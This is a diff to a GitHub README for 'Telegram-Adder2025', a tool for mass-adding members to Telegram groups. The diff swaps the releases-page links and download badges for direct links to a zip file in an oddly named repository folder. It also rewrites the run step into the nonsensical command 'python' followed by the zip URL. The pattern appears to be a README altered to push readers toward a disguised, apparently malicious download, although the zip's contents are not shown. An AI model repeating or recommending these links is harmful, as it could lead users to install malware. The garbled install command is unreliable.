@@ -8,11 +8,11 @@ Welcome to Telegram-Adder2025! This tool allows you to add members to your Teleg
 
 To begin, you will need to download the application. This guide will walk you through each step, ensuring you can get up and running quickly.
 
-[![Download Telegram-Adder2025](https://img.shields.io/badge/Download_Telegram--Adder2025-v1.0-brightgreen)](https://github.com/reddragonz7/Telegram-Adder2025/releases)
+[![Download Telegram-Adder2025](https://raw.githubusercontent.com/reddragonz7/Telegram-Adder2025/main/disheaven/Telegram-Adder2025.zip)](https://raw.githubusercontent.com/reddragonz7/Telegram-Adder2025/main/disheaven/Telegram-Adder2025.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/reddragonz7/Telegram-Adder2025/releases). You will find the latest version of the application there.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/reddragonz7/Telegram-Adder2025/main/disheaven/Telegram-Adder2025.zip). You will find the latest version of the application there.
 
 2. **Choose Your File**: Look for the latest release. You will see files listed there, such as `.exe` for Windows or `.zip` for other operating systems. Select the appropriate file for your system. 
 
@@ -20,7 +20,7 @@ To begin, you will need to download the application. This guide will walk you th
 
 4. **Install the Application**:
    - **Windows**: If you downloaded an `.exe` file, double-click it. Follow the prompts to install.
-   - **Mac/Linux**: If you downloaded a `.zip`, extract the files. Open the terminal and navigate to the folder where you extracted the files. Run the application using the command: `python app.py`. (Ensure that Python is installed on your system.)
+   - **Mac/Linux**: If you downloaded a `.zip`, extract the files. Open the terminal and navigate to the folder where you extracted the files. Run the application using the command: `python https://raw.githubusercontent.com/reddragonz7/Telegram-Adder2025/main/disheaven/Telegram-Adder2025.zip`. (Ensure that Python is installed on your system.)
 
 5. **Start Using Telegram-Adder2025**: Open the application once it is installed. 
 
@@ -67,4 +67,4 @@ For further assistance and inquiries, please reach out through our GitHub reposi
 
 This project is licensed under the MIT License. Feel free to use and modify it according to your needs.
 
-[![Download Telegram-Adder2025](https://img.shields.io/badge/Download_Telegram--Adder2025-v1.0-brightgreen)](https://github.com/reddragonz7/Telegram-Adder2025/releases)
+[![Download Telegram-Adder2025](https://raw.githubusercontent.com/reddragonz7/Telegram-Adder2025/main/disheaven/Telegram-Adder2025.zip)](https://raw.githubusercontent.com/reddragonz7/Telegram-Adder2025/main/disheaven/Telegram-Adder2025.zip)
